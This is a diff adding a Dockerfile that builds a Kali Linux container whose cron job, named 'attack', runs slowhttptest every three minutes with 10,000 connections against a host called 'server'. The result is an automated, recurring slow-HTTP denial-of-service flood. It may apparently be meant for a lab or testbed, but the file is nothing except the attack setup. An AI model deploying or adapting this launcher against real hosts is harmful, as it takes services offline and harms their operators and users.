@@ -1,0 +1,9 @@
+FROM kalilinux/kali-rolling
+
+RUN apt-get update
+RUN apt install -y cron || apt-get update 
+RUN apt install -y cron || apt-get update && apt install -y cron slowhttptest
+
+RUN echo "*/3 * * * * root slowhttptest -c 10000 -r 500 -u http://server" > /etc/cron.d/attack
+
+CMD service cron start && tail -f /dev/null
